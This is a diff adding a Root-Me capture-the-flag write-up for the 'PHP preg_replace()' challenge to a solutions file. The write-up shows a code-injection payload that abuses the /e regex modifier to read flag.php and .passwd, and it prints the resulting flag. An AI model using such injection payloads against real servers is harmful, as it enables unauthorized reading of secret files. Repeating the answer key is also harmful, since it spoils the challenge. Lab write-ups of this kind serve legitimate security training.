@@ -42,7 +42,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 34. [Local File Inclusion - Double encoding](#local-file-inclusion-double-encoding) 🗸
 35. [Node - Eval](#node-eval)
 36. [PHP - Loose Comparison](#php-loose-comparison)
-37. [PHP - preg_replace()](#php-preg-replace)
+37. [PHP - preg_replace()](#php-preg-replace) 🗸
 38. [PHP - type juggling](#php-type-juggling)
 39. [Remote File Inclusion](#remote-file-inclusion)
 40. [SQL injection - Authentication](#sql-injection-authentication) 🗸
@@ -3041,6 +3041,106 @@ Th1sIsTh3Fl4g!
 
 ---
 
+## PHP preg replace
+
+- Author: sambecks
+- Date: 2 March 2016
+- Points: 30
+- Level: 3
+
+### Statement
+
+Read flag.php
+
+</details>
+
+### Link
+
+- [ch37](http://challenge01.root-me.org/web-serveur/ch37/)
+
+### Resources
+
+None.
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+We can visit the website and find a html form with three inputs: search, replace and content:
+
+~~~html
+<html>
+<head><title>Regex evaluator</title></head>
+<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+
+<br /><br /><fieldset><legend>Regex evaluator</legend>
+<form METHOD="POST" action="index.php">
+<div>
+<input type="text" name="search" placeholder="search" style="width:250px;">
+</div>
+<br />
+<div>
+<input type="text" name="replace" placeholder="replace" style="width:250px;">
+</div>
+<br />
+<div>
+<input type="text" name="content" placeholder="content" style="width:250px;">
+</div>
+<br />
+<button type="submit">Submit</button>
+</form>
+~~~
+
+As detailed on the [php.net](https://www.php.net/manual/en/function.preg-replace.php) the preg replace searches a subject (content) for a patterm (search) and replaces them with a replacement (replace).  We can try a simple request:
+
+~~~
+search = /answer/e
+replace = file_get_contents("flag.php")
+content = the flag is answer
+~~~
+
+submitting this to the form, we get the response:
+
+~~~
+the flag is <?php $flag="".file_get_contents(".passwd").""; ?> 
+~~~
+
+We can adjust the query to:
+
+~~~
+search = /answer/e
+replace = file_get_contents(".passwd")
+content = the flag is answer
+~~~
+
+This gives the response:
+
+~~~
+the flag is pr3g_r3pl4c3_3_m0d1f13r_styl3
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+pr3g_r3pl4c3_3_m0d1f13r_styl3
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+	
 ## SQL injection Authentication
 
 - Author: g0uZ
